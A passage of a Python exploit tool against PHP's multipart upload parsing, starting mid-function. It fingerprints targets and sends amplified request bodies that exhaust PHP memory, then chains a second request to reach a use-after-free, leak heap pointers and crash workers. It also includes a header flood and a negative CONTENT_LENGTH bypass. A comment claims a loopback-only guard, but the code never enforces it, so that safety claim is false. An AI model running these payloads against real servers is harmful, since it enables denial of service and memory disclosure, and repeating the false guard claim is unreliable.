        print("[!] requests must be >= 1", file=sys.stderr)
        return 2

    server, powered = detect_http_identity(args.url)
    is_nginx = "nginx" in server.lower()
    vprint(f"[*] fingerprint: Server={server!r} X-Powered-By={powered!r}")
    if is_nginx and not args.force_chain:
        print("[!] nginx/FPM front end: the OOM kills the FPM child at request "
              "startup and its state dies with it,\n"
              "    so B has nothing to reclaim (that is the SAPI difference, "
              "not a tuning issue).\n"
              "    Falling back to --payload amp; pass --force-chain if this "
              "front end actually proxies mod_php.")
        return run_amp(args)
    if is_nginx:
        print("[!] forced on an nginx front end: same_conn=True only means the "
              "client connection stayed open --\n"
              "    nginx re-dispatches B to whatever FPM child is free, so a "
              "hit here is not interpretable.")

    target_version = parse_php_version(powered)
    boundary, plan, body_a, info = _amp_resolve(
        args, session=True, target_version=target_version)
    shapes = list(AMP_CHAIN_SHAPES[:max(1, min(args.chain_probes,
                                              len(AMP_CHAIN_SHAPES)))])
    pairs = args.requests * len(shapes)

    ver = info.get("version")
    print(f"[*] POST {target_desc}  A/B"
          + (f"  PHP/{ver[0]}.{ver[1]}" if ver else "")
          + f"  (A={human_size(len(body_a))} B)"
          + (f"  pairs={pairs}" if pairs > 1 else ""))
    print_legend()
    _amp_report(plan, info)
    _sapi_table()

    before = (docker_log_stats(args.docker_container)
              if args.docker_container else None)
    leaked = crashes = cookies = 0
    for pair in range(1, pairs + 1):
        fill, length = shapes[(pair - 1) % len(shapes)]
        body_b = build_amp_consumer(boundary, fill=fill, length=length)
        res = send_pair_keepalive(
            args.url, body_a, body_b, boundary, args.timeout,
            args.delay if not args.no_keepalive else 0.0,
        )
        st1, _h1, b1 = res["req1"]
        st2, h2, b2 = res["req2"]
        oom1 = OOM_MARKER in b1
        sess = extract_phpsessid(h2)
        hit = len(sess) > 32
        leaked += int(hit)
        cookies += int(bool(sess))
        if _VERBOSE:
            print(
                f"[{pair:04d}] A status={st1} resp={len(b1)}B {oom_text(oom1)} "
                f"| B(fill={fill},len={length}) status={st2} resp={len(b2)}B "
                f"sess_cookie={len(sess)}B leak={bool_text(hit, '1;32')} "
                f"same_conn={res['same_conn']} note={res['note']} "
                f"err={res['err']!r}"
            )
        else:
            print(clr(f"[pair {pair:04d}]", "2") + "  "
                  f"A: status={clr(status_label(st1), _status_color(st1, "http"))} "
                  f"bytes={clr(len(b1), '2')} oom={bool_text(oom1)}  |  "
                  f"B: status={clr(status_label(st2), _status_color(st2, "http"))} "
                  f"bytes={clr(len(b2), '2')} "
                  f"sess_cookie={clr(len(sess), '1;32' if hit else '2')} "
                  f"leak={bool_text(hit, '1;32')} "
                  f"same_conn={res['same_conn']}")
        if hit:
            hits = scan_heap_pointers(sess)[:3]
            print(
                f"        leaked {len(sess)}B head={sess[:32].hex()}\n"
                f"        top chunk bases={[(hex(base), n) for base, n in hits]}"
            )
        elif _VERBOSE and b2 and args.body_bytes > 0:
            print(f"        B body={b2[:args.body_bytes]!r}")

    after = (docker_log_stats(args.docker_container)
             if args.docker_container else None)
    if before is not None and after is not None:
        d11 = after["sigsegv"] - before["sigsegv"]
        d70 = after["exit70"] - before["exit70"]
        crashes = d11
        print(
            f"\n[*] {args.docker_container} log delta: "
            f"sigsegv={clr(d11, '1;32' if d11 > 0 else '2')} exit70={d70}"
        )
        if d70 and not is_nginx:
            print("    -> 'code 70' on this target means the OOM hit an FPM "
                  "child after all (front end is not mod_php).")

    vprint("[*] how to read this:\n"
           "    A oom=True                 -> OOM in request startup\n"
           "    B sess_cookie > 32B        -> stale session state reclaimed "
           "(heap leak)\n"
           "    B no Set-Cookie at all     -> stale send_cookie/session state "
           "not reached\n"
           "    new SIGSEGV                -> dangling pointer dereferenced")
    if leaked or crashes:
        print(clr(f"[*] verdict: UAF reached "
                  f"(leaks={leaked} sigsegv={crashes})", "1;32"))
    else:
        print(clr(f"[*] verdict: UAF not reached (B cookies={cookies}, "
                  f"sigsegv={crashes})", "2"))
        vprint("    A itself is proven (that body OOM'd the child); B is the "
               "Alpine 4-worker calibration, so a miss elsewhere is expected. "
               "Raise --chain-probes to sweep groom shapes.")
    return 0


def run_oom_probe(args) -> int:
    """Small OOM detection: header-line amplification, no crash chain.

    The default line count is generation-aware: PHP 5.6 OOMs at 800k lines
    (~4.8MB), PHP 7.x needs ~1.2M (~7.2MB, still below post_max_size=8M), and
    8.x OOMs at 800k.  This does NOT try to reach the $_FILES consumer/SIGSEGV
    path.  For a higher memory_limit raise --header-lines (and use a content
    length bypass if the body exceeds post_max_size).
    """
    if args.header_lines == 0:
        args.header_lines = 800000
        if args.url:
            _server, powered = detect_http_identity(args.url)
            version = parse_php_version(powered)
            if version and version[0] == 7:
                # 5-chain 7.x builds spend less per header line than 8.x; 800k
                # is just short, 1.2M is the most that still fits post_max_size
                args.header_lines = 1200000
    return run_header_flood(args)


def detect_http_identity(url: str):
    """Best-effort SAPI fingerprint from response headers."""
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    # Two attempts: the worker may be busy/restarting right after an OOM, and
    # losing the fingerprint costs the version-aware part count (the retry
    # ladder would then have to find the size the hard way).
    for attempt in range(2):
        conn = http.client.HTTPConnection(host, port, timeout=5)
        try:
            conn.request("GET", path)
            resp = conn.getresponse()
            resp.read()
            powered = resp.getheader("X-Powered-By", "") or ""
            server = resp.getheader("Server", "") or ""
            if powered or attempt:
                return server, powered
        except Exception:
            if attempt:
                return "", ""
        finally:
            conn.close()
        time.sleep(0.25)
    return "", ""


def run_auto(args) -> int:
    """Try the applicable payloads automatically.

    - FastCGI:        amp (direct to FPM; no front-end body limit at all).
    - nginx/FPM:      amp only.  The OOM is worker churn: no state survives the
                      child, so the amp-chain A/B premise does not hold.
    - Apache/mod_php: amp-chain first (small A/B, OOM -> UAF -> leak probe),
                      then amp as the plain detector.
    - Unknown:        amp first, then amp-chain as a fallback.
    """
    vprint("[*] payload=auto")

    if args.fcgi:
        vprint("[*] FastCGI target: amp only (no front end, no keep-alive)")
        return run_amp(args)

    if not args.url:
        print("[!] auto mode needs --url or --fcgi", file=sys.stderr)
        return 2

    server, powered = detect_http_identity(args.url)
    vprint(f"[*] fingerprint: Server={server!r} X-Powered-By={powered!r}")
    server_l = server.lower()
    powered_l = powered.lower()
    is_nginx = "nginx" in server_l
    # nginx also forwards "X-Powered-By: PHP", so only trust X-Powered-By
    # as a mod_php signal when the front end is not nginx.
    is_modphp = (not is_nginx) and (("apache" in server_l) or ("php" in powered_l))

    if is_modphp:
        vprint("[*] mod_php-like: amp-chain first (small A/B), then amp")
        rc = run_amp_chain(args)
        rc |= run_amp(args)
        return rc

    vprint("[*] running amp")
    rc = run_amp(args)
    if is_nginx:
        vprint("[*] nginx/FPM: amp-chain skipped (FPM clears state on OOM)")
    else:
        vprint("[*] target unknown: trying amp-chain as a fallback")
        run_amp_chain(args)
    return rc


def run_all(args) -> int:
    """Run the small amp payloads unconditionally.

    The legacy modphp-crash chain (~48MB bodies) stays explicit: it needs
    chunked encoding and a fresh worker, and most front ends reject the size.
    """
    print("[*] payload=all: amp + amp-chain")
    if args.fcgi:
        print("[*] FastCGI target: amp only")
        return run_amp(args)
    if not args.url:
        print("[!] all mode needs --url or --fcgi", file=sys.stderr)
        return 2

    server, powered = detect_http_identity(args.url)
    print(f"[*] fingerprint: Server={server!r} X-Powered-By={powered!r}")
    rc = run_amp(args)
    rc |= run_amp_chain(args)
    print("[*] legacy --payload modphp-crash is not part of 'all' "
          "(needs ~48MB chunked bodies and a fresh worker)")
    return rc


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Generic PHP-FPM OOM lab sender (HTTP or FastCGI)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    target = ap.add_mutually_exclusive_group(required=True)
    target.add_argument("--url", help="HTTP endpoint, e.g. http://127.0.0.1:8082/index.php")
    target.add_argument("--fcgi", help="FastCGI host:port, e.g. 127.0.0.1:9003")
    ap.add_argument("--payload",
                    choices=["auto", "all", "amp", "amp-chain", "oom",
                             "modphp-crash"],
                    default=None,
                    help="default (no --payload): same-wire control + amp; "
                         "amp=500x amplifier (~230KiB body, ~570x heap) and "
                         "SAPI-aware verdict; "
                         "amp-chain=mod_php A/B on one keep-alive connection "
                         "(OOM -> UAF -> leak probe); "
                         "auto=fingerprint and run the applicable payloads; "
                         "all=amp + amp-chain; "
                         "oom=header-line flood (~4.8-7.2MB) detector; "
                         "modphp-crash=legacy two-request SIGSEGV chain "
                         "(~48MB+~43MB at memory_limit=128M)")
    amp = ap.add_argument_group(
        "amp / amp-chain (500x amplifier: small body, huge metadata)")
    amp.add_argument("--amp-style", choices=["max", "safe"], default="max",
                     help="max=minimum-wire shape (1-byte boundary, append "
                          "index, unquoted name, 63 levels: 206,807B -> ~129MiB"
                          ", ~650x); safe=quoted form-data shape with 58 "
                          "levels (235,616B, ~570x), for strict parsers/older "
                          "builds")
    amp.add_argument("--amp-parts", type=int, default=None,
                     help="file parts (default: derived from --amp-target-mb "
                          "and the target's per-level cost; floor is style "
                          "max=880 / safe=950). The max []-append shape does "
                          "NOT hit max_input_vars; only safe's distinct "
                          "names do")
    amp.add_argument("--amp-depth", type=int, default=None,
                     help=f"[k] segments per name (default: max={62} -> 63 "
                          "levels, safe=57; 63 levels is the deepest "
                          "max_input_nesting_level=64 accepts)")
    amp.add_argument("--amp-keylen", type=int, default=None,
                     help="bytes per key (default 1 = 3 wire bytes per level)")
    amp.add_argument("--amp-target-mb", type=int, default=AMP_TARGET_MB,
                     help="heap to reach (default: just above the stock "
                          "memory_limit=128M). The part count is derived from "
                          "it and the target's per-level cost")
    amp.add_argument("--amp-bytes-per-level", type=int, default=0,
                     help="override the per-level heap cost (0 = auto: "
                          "6 chains 8.1+ = 2448B; 5 chains 8.0/7.x = 2010B; "
                          "5.x = 1552B)")
    amp.add_argument("--amp-budget-kb", type=int, default=AMP_DEFAULT_BUDGET_KB,
                     help="wire budget; the part count is shrunk to fit "
                          f"(default {AMP_DEFAULT_BUDGET_KB}KB sits under "
                          "nginx's 1m default)")
    amp.add_argument("--amp-session", action="store_true",
                     help="add PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS fields "
                          "(needed for the mod_php UAF; amp-chain always adds "
                          "them)")
    amp.add_argument("--amp-content-type", action="store_true",
                     help="add a Content-Type line per part (+26B wire each, "
                          "no memory benefit)")
    amp.add_argument("--force-chain", action="store_true",
                     help="run amp-chain even when the front end looks like "
                          "nginx (only if it proxies mod_php)")
    amp.add_argument("--amp-retries", type=int, default=2,
                     help="if the planned size comes back OK (e.g. PHP 7.x "
                          "allocates far less per level), retry 1.6x / 2.6x / "
                          "4x bigger inside --amp-budget-kb (0 = single shot)")
    amp.add_argument("--chain-probes", type=int, default=1,
                     help="amp-chain: B request variants per A (groom sweep; "
                          "1..8 shapes, each costs one extra OOM)")
    ap.add_argument("--no-control", action="store_true",
                    help="skip the preflight control group in default mode")
    ap.add_argument("--pad1-mb", type=float, default=35.0,
                    help="modphp-crash: first request pad in MiB")
    ap.add_argument("--pad2-mb", type=float, default=30.0,
                    help="modphp-crash: second request pad in MiB")
    ap.add_argument("--name-mb", type=float, default=11.0,
                    help="modphp-crash: nested field name size in MiB")
    ap.add_argument("--no-keepalive", action="store_true",
                    help="modphp-crash: use separate connections for the two requests")
    ap.add_argument("--delay", type=float, default=0.5,
                    help="modphp-crash: seconds between the two requests")
    ap.add_argument("--docker-container", default=None,
                    help="modphp-crash only: container name for SIGSEGV counting")
    ap.add_argument("--restart-container", default=None,
                    help="optional lab container to restart before modphp-crash")
    ap.add_argument("--script", default="/var/www/html/index.php",
                    help="SCRIPT_FILENAME for FastCGI mode")
    ap.add_argument("-k", "--requests", type=int, default=1,
                    help="oom: total requests; modphp-crash: number of pairs")
    ap.add_argument("-c", "--concurrency", type=int, default=1,
                    help=f"oom: threads, 1..{MAX_CONCURRENCY}")
    ap.add_argument("--rate", type=float, default=0.0,
                    help="oom: max requests/sec (0 = unlimited)")
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--boundary", default=None,
                    help="optional multipart boundary (default: random)")
    ap.add_argument("--header-lines", type=int, default=0,
                    help="oom: 'a: b' header lines in one part (default is "
                         "generation-aware: 800k = ~4.8MB on 5.x/8.x, 1.2M = "
                         "~7.2MB on 7.x); does NOT produce the mod_php SIGSEGV "
                         "chain in our tests")
    ap.add_argument("--probe-sizes", action="store_true",
                    help="HTTP only: send increasing body sizes and report "
                         "status/Server to find size limits")
    ap.add_argument("--probe-list", default="0.5,1,2,4,8,16,32",
                    help="comma-separated MiB sizes for --probe-sizes")
    ap.add_argument("--control", action="store_true",
                    help="HTTP only: send one same-size normal multipart field "
                         "plus a health check; prints a verdict")
    ap.add_argument("--control-size-mb", type=float, default=4.8,
                    help="control body size in MiB (default: 4.8)")
    ap.add_argument("--health-url", default=None,
                    help="GET URL for health checks (default: --url)")
    ap.add_argument("--content-length", default=None,
                    help="FastCGI: override CONTENT_LENGTH (e.g. -1 for the "
                         "PHP 5.x negative-length bypass)")
    ap.add_argument("--body-bytes", type=int, default=1000,
                    help="print this many bytes of each PHP response (0 = disable)")
    ap.add_argument("--color", choices=["auto", "always", "never"], default="auto",
                    help="ANSI highlight for oom/empty200/SIGSEGV labels")
    ap.add_argument("--no-legend", action="store_true",
                    help="do not print the output-field legend")
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="also print the payload plan (parts/wire/heap/ratio, "
                         "SAPI notes, response heads)")
    args = ap.parse_args()

    # Lab-only guard: refuse any target that is not loopback.  This is checked
    # before the first byte is sent, so an accidental public URL never gets a
    # probe.
    if args.url:
        host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
    else:
        host = (args.fcgi or "").rsplit(":", 1)[0].strip("[]").lower()

    set_verbose(args.verbose)
    set_legend(not args.no_legend)
    set_color(
        args.color == "always"
        or (args.color == "auto"
            and sys.stdout.isatty()
            and "NO_COLOR" not in os.environ)
    )

    if args.probe_sizes:
        return run_probe_sizes(args)
    if args.control:
        return run_control(args)

    payload = args.payload or "amp"

    if payload == "amp":
        return run_amp(args)
    if payload == "amp-chain":
        return run_amp_chain(args)
    if payload == "auto":
        return run_auto(args)
    if payload == "all":
        return run_all(args)
    if payload == "oom":
        return run_oom_probe(args)
    if payload == "modphp-crash":
        return run_modphp_crash(args)
    return 2


def run_header_flood(args) -> int:
    """Header-line flood detector (`--payload oom`).

    One multipart part whose header block contains N `a: b` lines.  Each 6-byte
    line costs a ~300B mime_header_entry (about 50x per wire byte) -- a
    different and much weaker primitive than the amp bracket chain (~650x).
    It is kept because it needs no $_FILES/upload path at all.
    """
    # ---- safety checks ----
    if args.url:
        host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
        mode = "http"
        target_desc = args.url
    else:
        if ":" not in args.fcgi:
            print("[!] --fcgi must be host:port", file=sys.stderr)
            return 2
        host, port_s = args.fcgi.rsplit(":", 1)
        host = host.strip("[]").lower()
        try:
            int(port_s)
        except ValueError:
            print("[!] --fcgi port must be an integer", file=sys.stderr)
            return 2
        mode = "fcgi"
        target_desc = args.fcgi

    if not (1 <= args.concurrency <= MAX_CONCURRENCY):
        print(f"[!] concurrency must be 1..{MAX_CONCURRENCY}", file=sys.stderr)
        return 2
    if args.requests < 1:
        print("[!] requests must be >= 1", file=sys.stderr)
        return 2
    if args.rate < 0:
        print("[!] rate must be >= 0", file=sys.stderr)
        return 2
    if args.header_lines < 1:
        print("[!] --payload oom needs --header-lines >= 1", file=sys.stderr)
        return 2
    if args.content_length is not None and mode != "fcgi":
        print("[!] --content-length only applies to --fcgi mode", file=sys.stderr)
        return 2

    boundary = (args.boundary.encode() if args.boundary
                else b"----oom-" + os.urandom(8).hex().encode())
    body = build_body(boundary, header_lines=args.header_lines)

    print(f"[*] POST {target_desc}  ({human_size(len(body))} body)")
    print_legend(with_summary=True)
    vprint(
        f"[*] mode={mode} header_lines={args.header_lines} "
        f"requests={args.requests} concurrency={args.concurrency} "
        f"rate={args.rate or 'unlimited'}"
    )
    if len(body) > 8 * 1024 * 1024:
        if mode == "fcgi" and args.content_length is not None:
            print("[!] body > 8MiB: CONTENT_LENGTH override is the intended "
                  "post_max_size bypass for FastCGI")
        else:
            print("[!] body > 8MiB: nginx client_max_body_size / PHP "
                  "post_max_size may reject it before it can OOM")

    lock = threading.Lock()
    rate_lock = threading.Lock()
    next_slot = [time.monotonic()]
    counters = {"sent": 0, "oom": 0, "errors": 0, "non200": 0, "ok": 0,
                "empty200": 0, "suspected": 0}
    kinds: dict[str, int] = {}
    status_counts: dict[str, int] = {}

    def wait_rate() -> None:
        if args.rate <= 0:
            return
        with rate_lock:
            now = time.monotonic()
            delay = max(0.0, next_slot[0] - now)
            next_slot[0] = max(now, next_slot[0]) + 1.0 / args.rate
        if delay:
            time.sleep(delay)

    def worker() -> None:
        while True:
            with lock:
                if counters["sent"] >= args.requests:
                    return
                counters["sent"] += 1
                idx = counters["sent"]
            wait_rate()

            if mode == "http":
                status, data, error = send_http(
                    args.url, body, boundary, args.timeout
                )
                kind = resp_kind(status, data, error)
                oom = kind == "OOM"
                resp_len = len(data)
                empty200 = kind == "EMPTY200"
                suspected = (not oom) and (empty200 or kind in
                                           ("UPSTREAM", "ERROR", "FATAL500"))
                with lock:
                    counters["oom"] += int(oom)
                    counters["errors"] += int(bool(error))
                    counters["non200"] += int(status != 200)
                    # "ok" means a *usable* response: an empty 200 is its own
                    # bucket, otherwise the summary contradicts itself
                    # (ok=1 AND empty200=1 AND suspected_oom=1).
                    counters["ok"] += int(kind == "OK")
                    counters["empty200"] += int(empty200)
                    counters["suspected"] += int(suspected)
                    kinds[kind] = kinds.get(kind, 0) + 1
                    key = str(status)
                    status_counts[key] = status_counts.get(key, 0) + 1
                    note = ("200 with an empty body: fatal text hidden by "
                            "the target" if empty200 else "")
                    print(resp_line(idx, status, data, error,
                                    note=note), flush=True)
                    if _VERBOSE and args.body_bytes > 0 and data:
                        print(f"        head={data[:args.body_bytes]!r}",
                              flush=True)
            else:
                app_status, stdout, stderr, error = send_fcgi(
                    host, int(port_s), args.script, body, boundary,
                    args.timeout, args.content_length
                )
                oom = OOM_MARKER in stdout or OOM_MARKER in stderr
                empty_output = (app_status == 0 and not stdout and not stderr)
                suspected = (not oom) and (app_status is None or bool(error)
                                           or empty_output)
                kind = ("OOM" if oom else
                        "EMPTY200" if empty_output else
                        "ERROR" if (error or app_status is None) else "OK")
                with lock:
                    counters["oom"] += int(oom)
                    counters["errors"] += int(bool(error))
                    counters["non200"] += int(app_status not in (0, None))
                    counters["ok"] += int(kind == "OK")
                    counters["empty200"] += int(empty_output)
                    counters["suspected"] += int(suspected)
                    kinds[kind] = kinds.get(kind, 0) + 1
                    key = str(app_status)
                    status_counts[key] = status_counts.get(key, 0) + 1
                    if _VERBOSE:
                        print(
                            f"[{idx:04d}] app_status={app_status} "
                            f"out={len(stdout)}B err={len(stderr)}B "
                            f"kind={kind_text(kind)} {oom_text(oom)} "
                            f"suspected_oom={bool_text(suspected)} "
                            f"err_msg={error!r}", flush=True)
                    else:
                        note = ("FCGI app_status=0 with an empty body: fatal "
                                "text hidden" if empty_output else "")
                        print(resp_line(idx, app_status, stdout, error,
                                        note=note, mode="fcgi"), flush=True)
                    if args.body_bytes > 0 and stdout:
                        print(f"        stdout={stdout[:args.body_bytes]!r}", flush=True)
                    if args.body_bytes > 0 and stderr:
                        print(f"        stderr={stderr[:args.body_bytes]!r}", flush=True)

    threads = [
        threading.Thread(target=worker, daemon=True)
        for _ in range(min(args.concurrency, args.requests))
    ]
    start = time.monotonic()
    for th in threads:
        th.start()
    try:
        for th in threads:
            th.join()
    except KeyboardInterrupt:
        print("\n[!] Ctrl-C", flush=True)

    elapsed = time.monotonic() - start
    print(
        f"\n[*] done: sent={counters['sent']} "
        f"oom={clr(counters['oom'], '1;32' if counters['oom'] else '2')} "
        f"empty200={clr(counters['empty200'], '1;33' if counters['empty200'] else '2')} "
        f"suspected_oom={clr(counters['suspected'], '1;33' if counters['suspected'] else '2')} "
        f"ok={clr(counters['ok'], '1;32' if counters['ok'] else '2')} "
        f"non200={clr(counters['non200'], '1;31' if counters['non200'] else '2')} "
        f"errors={clr(counters['errors'], '1;31' if counters['errors'] else '2')} "
        f"elapsed={elapsed:.1f}s statuses={status_counts}"
    )
    if counters["ok"]:
        vprint("[*] note: ok = a 200 with a body; an empty 200 is counted as "
               "empty200, not as ok.")
    if counters["oom"]:
        print(clr("[*] verdict: CONFIRMED -- 'Allowed memory size' in the "
                  "response body", "1;32"))
    elif kinds.get("TOO_LARGE"):
        print(clr(f"[*] verdict: BLOCKED -- HTTP 413, front-end limit is "
                  f"below {human_size(len(body))}", "1;31"))
        vprint("    Raise client_max_body_size / LimitRequestBody, or use "
               "--payload amp (~206KiB, under nginx's 1m default).")
    elif counters["suspected"]:
        if mode == "http":
            print(clr("[*] verdict: LIKELY OOM -- HTTP 200 with 0 bytes "
                      "(fatal text hidden by the target)", "1;33"))
            vprint("    The empty 200 / 502 is the symptom; only the "
                   "'Allowed memory size' text is proof.")
        else:
            print(
                "[*] FPM likely OOM'd during request startup: the child closed "
                "the FastCGI connection before sending output.\n"
                "    The client-side signal is a broken pipe / empty stdout.\n"
                "    Raise --header-lines, and use --content-length -1 to "
                "bypass post_max_size on PHP 5.x."
            )
    else:
        print(clr("[*] verdict: NO OOM -- responses: "
                  + ", ".join(f"status {k} x{v}"
                              for k, v in sorted(status_counts.items())), "2"))
        vprint("    Check 'fastcgi_buffering off;' and client_max_body_size; "
               "for PHP 5.x/7.x the per-level cost differs (use --payload amp, "
               "which scales by version).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
